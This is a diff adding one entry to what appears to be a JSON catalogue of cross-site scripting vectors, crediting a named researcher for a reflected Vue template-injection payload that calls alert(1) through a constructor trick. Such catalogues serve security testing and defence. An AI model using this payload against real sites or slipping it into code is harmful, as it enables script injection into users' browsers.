@@ -52,5 +52,18 @@
         "hash": "",
         "type": "reflected",
         "csp": false
+    },
+    {
+        "authors": [
+            {
+                "name": "Peter af Geijerstam",
+                "company": "Swedish Shellcode Factory",
+                "twitterUrl": "https:\/\/twitter.com\/p4fg"
+            }
+        ],
+        "vector": "<x v-if=_c.constructor('alert(1)')()>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false
     }
 ]
